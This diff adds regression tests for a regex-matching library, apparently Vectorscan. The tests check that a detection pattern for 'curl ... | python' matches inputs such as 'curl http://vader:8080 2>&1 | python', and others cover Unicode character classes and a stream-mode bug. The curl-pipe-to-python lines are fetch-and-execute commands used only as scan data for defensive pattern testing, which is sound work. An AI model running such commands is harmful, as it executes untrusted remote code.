@@ -277,3 +277,232 @@ TEST(bug317, regressionOnx86Bug317) {
     hs_free_database(database);
     err = hs_free_scratch(scratch);
 }
+
+TEST(ArmRegression, FalseNegativeWithBackslashS_Short) {
+    hs_database_t *db = nullptr;
+    hs_compile_error_t *compile_err = nullptr;
+    
+    const char *pattern = "curl.*\\|\\s*python";
+    hs_error_t err = hs_compile(pattern, HS_FLAG_DOTALL, HS_MODE_BLOCK, 
+                                 nullptr, &db, &compile_err);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(db != nullptr);
+
+    hs_scratch_t *scratch = nullptr;
+    err = hs_alloc_scratch(db, &scratch);
+    ASSERT_EQ(HS_SUCCESS, err);
+
+    const char *input = "curl http://xxx:8000 2>&1 | python";
+    
+    bool matched = false;
+    auto cb = [](unsigned int, unsigned long long, unsigned long long, 
+                 unsigned int, void *ctx) -> int {
+        *static_cast<bool*>(ctx) = true;
+        return 0;
+    };
+
+    err = hs_scan(db, input, strlen(input), 0, scratch, cb, &matched);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(matched) << "Pattern should match input with 3-char hostname";
+
+    hs_free_scratch(scratch);
+    hs_free_database(db);
+}
+
+TEST(ArmRegression, FalseNegativeWithBackslashS_Long) {
+    hs_database_t *db = nullptr;
+    hs_compile_error_t *compile_err = nullptr;
+    
+    const char *pattern = "curl.*\\|\\s*python";
+    hs_error_t err = hs_compile(pattern, HS_FLAG_DOTALL, HS_MODE_BLOCK, 
+                                 nullptr, &db, &compile_err);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(db != nullptr);
+
+    hs_scratch_t *scratch = nullptr;
+    err = hs_alloc_scratch(db, &scratch);
+    ASSERT_EQ(HS_SUCCESS, err);
+
+    const char *input = "curl http://xxxx:8000 2>&1 | python";
+    
+    bool matched = false;
+    auto cb = [](unsigned int, unsigned long long, unsigned long long, 
+                 unsigned int, void *ctx) -> int {
+        *static_cast<bool*>(ctx) = true;
+        return 0;
+    };
+
+    err = hs_scan(db, input, strlen(input), 0, scratch, cb, &matched);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(matched) << "Pattern should match input with 4-char hostname";
+
+    hs_free_scratch(scratch);
+    hs_free_database(db);
+}
+
+TEST(ArmRegression, FalseNegativeWithBackslashS_RealWorld) {
+    hs_database_t *db = nullptr;
+    hs_compile_error_t *compile_err = nullptr;
+    
+    const char *pattern = "curl.*\\|\\s*python";
+    hs_error_t err = hs_compile(pattern, HS_FLAG_DOTALL, HS_MODE_BLOCK, 
+                                 nullptr, &db, &compile_err);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(db != nullptr);
+
+    hs_scratch_t *scratch = nullptr;
+    err = hs_alloc_scratch(db, &scratch);
+    ASSERT_EQ(HS_SUCCESS, err);
+
+    const char *input = "curl http://vader:8080 2>&1 | python";
+    
+    bool matched = false;
+    auto cb = [](unsigned int, unsigned long long, unsigned long long, 
+                 unsigned int, void *ctx) -> int {
+        *static_cast<bool*>(ctx) = true;
+        return 0;
+    };
+
+    err = hs_scan(db, input, strlen(input), 0, scratch, cb, &matched);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(matched) << "Pattern should match real-world curl|python input";
+
+    hs_free_scratch(scratch);
+    hs_free_database(db);
+}
+
+TEST(ArmRegression, FalseNegativeWithBackslashS_CharClassAlsoFails) {
+    hs_database_t *db = nullptr;
+    hs_compile_error_t *compile_err = nullptr;
+    
+    const char *pattern = "curl.*\\|[ \\t]*python";
+    hs_error_t err = hs_compile(pattern, HS_FLAG_DOTALL, HS_MODE_BLOCK, 
+                                 nullptr, &db, &compile_err);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(db != nullptr);
+
+    hs_scratch_t *scratch = nullptr;
+    err = hs_alloc_scratch(db, &scratch);
+    ASSERT_EQ(HS_SUCCESS, err);
+
+    const char *input = "curl http://xxxx:8000 2>&1 | python";
+    
+    bool matched = false;
+    auto cb = [](unsigned int, unsigned long long, unsigned long long, 
+                 unsigned int, void *ctx) -> int {
+        *static_cast<bool*>(ctx) = true;
+        return 0;
+    };
+
+    err = hs_scan(db, input, strlen(input), 0, scratch, cb, &matched);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(matched) << "Pattern with [ \\t]* should match (but fails due to bug)";
+
+    hs_free_scratch(scratch);
+    hs_free_database(db);
+}
+
+TEST(ArmRegression, NoDotAll_Short) {
+    hs_database_t *db = nullptr;
+    hs_compile_error_t *compile_err = nullptr;
+    
+    const char *pattern = "curl.*\\|\\s*python";
+    hs_error_t err = hs_compile(pattern, 0, HS_MODE_BLOCK, 
+                                 nullptr, &db, &compile_err);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(db != nullptr);
+
+    hs_scratch_t *scratch = nullptr;
+    err = hs_alloc_scratch(db, &scratch);
+    ASSERT_EQ(HS_SUCCESS, err);
+
+    const char *input = "curl http://xxx:8000 2>&1 | python";
+    
+    bool matched = false;
+    auto cb = [](unsigned int, unsigned long long, unsigned long long, 
+                 unsigned int, void *ctx) -> int {
+        *static_cast<bool*>(ctx) = true;
+        return 0;
+    };
+
+    err = hs_scan(db, input, strlen(input), 0, scratch, cb, &matched);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(matched) << "Without DOTALL: 3-char hostname should match";
+
+    hs_free_scratch(scratch);
+    hs_free_database(db);
+}
+
+TEST(ArmRegression, NoDotAll_Long) {
+    hs_database_t *db = nullptr;
+    hs_compile_error_t *compile_err = nullptr;
+    
+    const char *pattern = "curl.*\\|\\s*python";
+    hs_error_t err = hs_compile(pattern, 0, HS_MODE_BLOCK, 
+                                 nullptr, &db, &compile_err);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(db != nullptr);
+
+    hs_scratch_t *scratch = nullptr;
+    err = hs_alloc_scratch(db, &scratch);
+    ASSERT_EQ(HS_SUCCESS, err);
+
+    const char *input = "curl http://xxxx:8000 2>&1 | python";
+    
+    bool matched = false;
+    auto cb = [](unsigned int, unsigned long long, unsigned long long, 
+                 unsigned int, void *ctx) -> int {
+        *static_cast<bool*>(ctx) = true;
+        return 0;
+    };
+
+    err = hs_scan(db, input, strlen(input), 0, scratch, cb, &matched);
+    ASSERT_EQ(HS_SUCCESS, err);
+    ASSERT_TRUE(matched) << "Without DOTALL: 4-char hostname should match";
+
+    hs_free_scratch(scratch);
+    hs_free_database(db);
+}
+
+
+TEST(utf8, charclass_issue_326) {
+    /*
+     * This is a modified test case from https://github.com/VectorCamp/vectorscan/issues/326
+     * It includes both test patterns mentioned in the issue.
+     */
+    vector<pattern> unicode_patterns = {
+    pattern(R"(\x{ff15}\x{ff10}\x{ff17}\x{ff15}\x{ff10}[\x{ff10}-\x{ff19}]{7})",
+        HS_FLAG_DOTALL | HS_FLAG_PREFILTER | HS_FLAG_MULTILINE | HS_FLAG_CASELESS | HS_FLAG_UCP | HS_FLAG_UTF8, 1),
+    pattern(R"(NL[0-9\x{ff10}-\x{ff19}]{2}[A-Z\x{ff21}-\x{ff3a}a-z\x{ff41}-\x{ff5a}]{4}[0-9\x{ff10}-\x{ff19}]{10})",
+        HS_FLAG_PREFILTER | HS_FLAG_SINGLEMATCH| HS_FLAG_UTF8, 2)
+    };
+    const char *data1 = "５０７５０７８３２４０１";
+    const char *data2 = "NL２０INGB０００１２３４567";
+
+    hs_database_t *db = buildDB(unicode_patterns, HS_MODE_NOSTREAM);
+    ASSERT_NE(nullptr, db);
+
+    hs_scratch_t *scratch = nullptr;
+    hs_error_t err = hs_alloc_scratch(db, &scratch);
+    ASSERT_EQ(HS_SUCCESS, err);
+
+    CallBackContext c1, c2;
+    err = hs_scan(db, data1, strlen(data1), 0, scratch, record_cb, reinterpret_cast<void *>(&c1));
+    ASSERT_EQ(HS_SUCCESS, err);
+    
+    err = hs_scan(db, data2, strlen(data2), 0, scratch, record_cb, reinterpret_cast<void *>(&c2));
+    ASSERT_EQ(HS_SUCCESS, err);
+
+    ASSERT_EQ(MatchRecord(36, 1), c1.matches[0]);
+    ASSERT_EQ(MatchRecord(36, 2), c2.matches[0]);
+    err = hs_free_scratch(scratch);
+    ASSERT_EQ(HS_SUCCESS, err);
+    hs_free_database(db);
+}
+
+TEST(bug339, delayed_fragment_assert) {
+    hs_database_t *db = buildDB(R"((?:1\d|3[01])(?:0[1-9]|1[01])\d)", 0, 0, HS_MODE_STREAM);
+    ASSERT_NE(nullptr, db);
+
+    hs_free_database(db);
+}
